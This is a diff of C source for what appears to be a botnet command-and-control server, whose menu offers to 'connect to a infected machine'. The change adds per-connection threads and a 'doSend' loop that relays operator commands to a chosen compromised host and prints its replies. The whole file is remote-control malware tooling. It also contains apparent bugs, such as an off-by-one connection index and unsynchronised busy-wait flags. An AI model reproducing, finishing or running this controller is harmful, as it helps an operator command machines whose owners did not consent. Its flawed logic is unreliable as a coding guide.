@@ -13,18 +13,19 @@
 
 /********************  Method stubs  ***************************/
 //Build the cmd controller
-int initCmdController(void);
+void initCmdController(void);
 //Listen to the port, and get the connection
 int initPortListener(void);
+void controlThread(int conn);
 //Start a new thread to listen socket request.
-void initSocketServer(pthread_t tid);
+void initSocketServer(void);
 //Close the controller
 int closeConnections(void);
 
 //Command implementation
 void doConnect(char *cmd);
 void doList(void);
-void doExit(void);
+void doSend(int conn);
 
 //Command cut(eg, cut "connect 127.0.0.1" to "127.0.0.1")
 char *cmdCut(char *cmd, int start);
@@ -32,7 +33,7 @@ char *cmdCut(char *cmd, int start);
 void exitIfError(int rv);
 
 /********************  Globle variables  ***************************/
-#define SP_PORT  6649
+#define SP_PORT  6637
 #define QUEUE   20
 #define BUFFER_SIZE 1024
 int runable;                    //To stop the port listener.
@@ -41,15 +42,16 @@ struct sockaddr_in addrs[256];  //The address for each socket connection
 int connnum;                    //Connection numbers
 int currentConn;                //Current connection
 int server_sockfd;              //Server socket
+int threadFlag;                 //A thread flag to define which thread get the input
 pthread_attr_t attr;            //Pthread attribute
 
 int main()
 {
-    exitIfError(initPortListener());
-    exitIfError(initCmdController());
+    initPortListener();
+    initSocketServer();
 }
 
-void initSocketServer(pthread_t tid){
+void initSocketServer(void){
     int rv;
     struct sockaddr_in server_sockaddr;
     server_sockaddr.sin_family = AF_INET;
@@ -57,12 +59,18 @@ void initSocketServer(pthread_t tid){
     server_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
     socklen_t length = sizeof(server_sockaddr);
     
+    pthread_t tid;
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
+    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+    
     server_sockfd = socket(AF_INET,SOCK_STREAM, 0);
     rv = bind(server_sockfd,(struct sockaddr *)&server_sockaddr,sizeof(server_sockaddr));
     exitIfError(listen(server_sockfd,QUEUE));
     runable = 1;
     connnum = 0;
     currentConn = -1;
+    threadFlag = 0;
     
     while(runable){
         conns[connnum] = accept(server_sockfd, (struct sockaddr*)&addrs[connnum], &length);
@@ -71,6 +79,7 @@ void initSocketServer(pthread_t tid){
             inet_ntoa(addrs[connnum].sin_addr), 
             addrs[connnum].sin_port);
         connnum++;
+        rv=pthread_create(&tid, &attr, (void*)controlThread, conns[connnum]);
     }
     close(server_sockfd);
 }
@@ -82,27 +91,43 @@ int initPortListener(void){
     
     pthread_attr_init(&attr);
     pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
-    rv=pthread_create(&tid, &attr, (void*)initSocketServer, (void*)tid);
+    rv=pthread_create(&tid, &attr, (void*)initCmdController, NULL);
     
     return rv;
 }
 
-int initCmdController(void){
+void controlThread(int conn){
+    char cmd[BUFFER_SIZE];
+    
+    while(runable){
+        while(runable && conn != currentConn);
+        
+        printf("Yes, in this thread now\n");
+        while (fgets(cmd, sizeof(cmd), stdin) != NULL){
+            if(strcmp(cmd, "send\n") == 0) {
+                doSend(conn);
+                break;
+            } 
+            printf("$ ");
+        }
+        threadFlag = 0;
+    }
+}
+
+void initCmdController(void){
     char cmd[BUFFER_SIZE];
     
     printf("Command includes:\n1.[connect ip]connect to a infected machine\n$ ");
     while (fgets(cmd, sizeof(cmd), stdin) != NULL){
         if(strcmp(cmd, "exit\n") == 0) {
-            doExit();
             break;
         } 
         if(strncmp(cmd, "connect", 7) == 0) doConnect(cmdCut(cmd, 7));
         else if(strncmp(cmd, "list", 4) == 0) doList();
         
+        while(threadFlag);
         printf("$ ");
     }
-    
-    return 0;
 }
 
 void exitIfError(int rv){
@@ -118,6 +143,7 @@ void doConnect(char *cmd){
     for(i=0; i<connnum; i++){
         addr = inet_ntoa(addrs[i].sin_addr);
         if(strncmp(addr, cmd, strlen(addr)) == 0){
+            threadFlag = 1;
             currentConn = i;
             printf("Connect success!\n");
             break;
@@ -125,19 +151,26 @@ void doConnect(char *cmd){
     }
 }
 
-void doExit(){
-    int i, len;
-    runable = 0;
-    char exitbuf[BUFFER_SIZE];
-    memcpy(exitbuf, "exit\n", strlen("exit\n"));
-    printf("Value is %s", exitbuf);
-    for(i=0; i<connnum; i++){
-        len = recv(conns[connnum], exitbuf, sizeof(exitbuf),0);
-        printf("value is [%s], %d\n", exitbuf, len, strlen(exitbuf));
-        send(conns[connnum], exitbuf, len,0); 
-        close(conns[connnum]);
+void doSend(int conn){
+    char sendbuf[BUFFER_SIZE];
+    char recvbuf[BUFFER_SIZE];
+    int rv;
+    
+    printf("I am doing send\n");
+    while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
+    {
+        printf("Sendbuf %s\n", sendbuf);
+        if(strcmp(sendbuf,"exit\n")==0)
+            break;
+        rv = send(conn, sendbuf, strlen(sendbuf),0); 
+        printf("Return value is %d", rv);
+        rv = recv(conn, recvbuf, sizeof(recvbuf),0);
+        printf("Return value is %d", rv);
+        fputs(recvbuf, stdout);
+
+        memset(sendbuf, 0, sizeof(sendbuf));
+        memset(recvbuf, 0, sizeof(recvbuf));
     }
-    close(server_sockfd);
 }
 
 void doList(){
